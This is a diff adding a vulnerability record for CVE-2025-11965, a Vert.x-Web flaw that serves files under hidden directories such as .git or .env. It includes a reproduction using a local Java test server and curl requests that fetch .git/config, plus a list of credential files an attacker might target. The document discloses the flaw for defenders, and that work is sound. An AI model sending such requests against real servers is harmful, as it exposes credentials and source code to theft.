@@ -1,0 +1,231 @@
+vulnerability_id: VCID-cwwp-9ga7-tqg5
+aliases:
+  - CVE-2025-11965
+  - GHSA-h5fg-jpgr-rv9c
+summary: |
+  Vert.x-Web Access Control Flaw in StaticHandler’s Hidden File Protection for Files Under Hidden Directories
+  # Description
+
+  There is a flaw in the hidden file protection feature of Vert.x Web’s `StaticHandler` when `setIncludeHidden(false)` is configured.
+
+  In the current implementation, only files whose final path segment (i.e., the file name) begins with a dot (`.`) are treated as “hidden” and are blocked from being served. However, this logic fails in the following cases:
+
+  - **Files under hidden directories**: For example, `/.secret/config.txt` — although `.secret` is a hidden directory, the file `config.txt` itself does not start with a dot, so it gets served.
+  - **Real-world impact**: Sensitive files placed in hidden directories like `.git`, `.env`, `.aws` may become publicly accessible.
+
+  As a result, the behavior does not meet the expectations set by the `includeHidden=false` configuration, which should ideally protect all hidden files and directories. This gap may lead to unintended exposure of sensitive information.
+
+  # Steps to Reproduce
+
+  ```bash
+  1. Prepare test environment
+
+  # Create directory structure
+  mkdir -p src/test/resources/webroot/.secret
+  mkdir -p src/test/resources/webroot/.git
+
+  # Place test files
+  echo "This is a visible file" > src/test/resources/webroot/visible.txt
+  echo "This is a hidden file" > src/test/resources/webroot/.hidden.txt
+  echo "SECRET DATA: API_KEY=abc123" > src/test/resources/webroot/.secret/config.txt
+  echo "Git config data" > src/test/resources/webroot/.git/config
+  ```
+
+  ```java
+  2. Implement test server
+
+  import io.vertx.core.AbstractVerticle;
+  import io.vertx.core.Vertx;
+  import io.vertx.ext.web.Router;
+  import io.vertx.ext.web.handler.StaticHandler;
+
+  public class StaticHandlerTestServer extends AbstractVerticle {
+    @Override
+    public void start() {
+      Router router = Router.router(vertx);
+
+      // Configure to not serve hidden files
+      StaticHandler staticHandler = StaticHandler.create("src/test/resources/webroot")
+        .setIncludeHidden(false)
+        .setDirectoryListing(false);
+
+      router.route("/*").handler(staticHandler);
+
+      vertx.createHttpServer()
+        .requestHandler(router)
+        .listen(8082);
+    }
+
+    public static void main(String[] args) {
+      Vertx vertx = Vertx.vertx();
+      vertx.deployVerticle(new StaticHandlerTestServer());
+    }
+  }
+  ```
+
+  ```bash
+  3. Confirm the vulnerability
+
+  # Normal file (accessible)
+  curl http://localhost:8082/visible.txt
+  # Result: 200 OK
+
+  # Hidden file (correctly blocked)
+  curl http://localhost:8082/.git
+  # Result: 404 Not Found
+
+  # File under hidden directory (vulnerable)
+  curl http://localhost:8082/.git/config
+  # Result: 200 OK - Returns contents of Git config
+  ```
+
+  # Potential Impact
+
+  ## 1. Information Disclosure
+
+  Examples of sensitive files that could be exposed:
+
+  - `.git/config`: Git repository settings (e.g., remote URL, credentials)
+  - `.env/*`: Environment variables (API keys, DB credentials)
+  - `.aws/credentials`: AWS access keys
+  - `.ssh/known_hosts`: SSH host trust info
+  - `.docker/config.json`: Docker registry credentials
+
+  ## 2. Attack Scenarios
+
+  - Attackers can guess common hidden directory names and enumerate filenames under them to access confidential data.
+  - Especially dangerous for `.git/HEAD`, `.git/config`, `.git/objects/*` — which may allow full reconstruction of source code.
+
+  ## 3. Affected Scope
+
+  - **Affected version**: Vert.x Web 5.1.0-SNAPSHOT (likely earlier versions as well)
+  - **Environments**: All OSes (Windows, Linux, macOS)
+  - **Configurations**: All applications using `StaticHandler.setIncludeHidden(false)`
+severities:
+  - score: '5.3'
+    scoring_system: cvssv3
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
+    published_at: None
+    url: https://access.redhat.com/hydra/rest/securitydata/cve/CVE-2025-11965.json
+  - score: '0.00042'
+    scoring_system: epss
+    scoring_elements: '0.12478'
+    published_at: '2025-10-24 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-11965
+  - score: '0.00042'
+    scoring_system: epss
+    scoring_elements: '0.12492'
+    published_at: '2025-10-23 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-11965
+  - score: '0.00042'
+    scoring_system: epss
+    scoring_elements: '0.12482'
+    published_at: '2025-10-25 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-11965
+  - score: '0.00055'
+    scoring_system: epss
+    scoring_elements: '0.17406'
+    published_at: '2025-10-29 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-11965
+  - score: '0.00055'
+    scoring_system: epss
+    scoring_elements: '0.17403'
+    published_at: '2025-10-28 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-11965
+  - score: '0.00055'
+    scoring_system: epss
+    scoring_elements: '0.17414'
+    published_at: '2025-11-03 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-11965
+  - score: '0.00055'
+    scoring_system: epss
+    scoring_elements: '0.17458'
+    published_at: '2025-11-02 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-11965
+  - score: '0.00055'
+    scoring_system: epss
+    scoring_elements: '0.17405'
+    published_at: '2025-10-30 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-11965
+  - score: '0.00063'
+    scoring_system: epss
+    scoring_elements: '0.19931'
+    published_at: '2026-01-11 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-11965
+  - score: '0.00063'
+    scoring_system: epss
+    scoring_elements: '0.19954'
+    published_at: '2026-01-08 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-11965
+  - score: MODERATE
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/advisories/GHSA-h5fg-jpgr-rv9c
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/vert-x3/vertx-web
+  - score: MODERATE
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/vert-x3/vertx-web/security/advisories/GHSA-h5fg-jpgr-rv9c
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/vert-x3/vertx-web/security/advisories/GHSA-h5fg-jpgr-rv9c
+  - score: '6.3'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N
+    published_at: None
+    url: https://gitlab.eclipse.org/security/vulnerability-reports/-/issues/304
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://gitlab.eclipse.org/security/vulnerability-reports/-/issues/304
+  - score: Track
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:Y/T:P/P:M/B:A/M:M/D:T/2025-10-22T15:55:52Z/
+    published_at: None
+    url: https://gitlab.eclipse.org/security/vulnerability-reports/-/issues/304
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2025-11965
+weaknesses:
+  - CWE-552
+  - CWE-1035
+  - CWE-937
+references:
+  - url: https://access.redhat.com/hydra/rest/securitydata/cve/CVE-2025-11965.json
+    reference_type:
+    reference_id:
+  - url: https://api.first.org/data/v1/epss?cve=CVE-2025-11965
+    reference_type:
+    reference_id:
+  - url: https://github.com/vert-x3/vertx-web
+    reference_type:
+    reference_id:
+  - url: https://github.com/vert-x3/vertx-web/security/advisories/GHSA-h5fg-jpgr-rv9c
+    reference_type:
+    reference_id:
+  - url: https://gitlab.eclipse.org/security/vulnerability-reports/-/issues/304
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-11965
+    reference_type:
+    reference_id:
+  - url: https://bugzilla.redhat.com/show_bug.cgi?id=2405820
+    reference_type:
+    reference_id: 2405820
+  - url: https://github.com/advisories/GHSA-h5fg-jpgr-rv9c
+    reference_type:
+    reference_id: GHSA-h5fg-jpgr-rv9c
+  - url: https://access.redhat.com/errata/RHSA-2025:23417
+    reference_type:
+    reference_id: RHSA-2025:23417
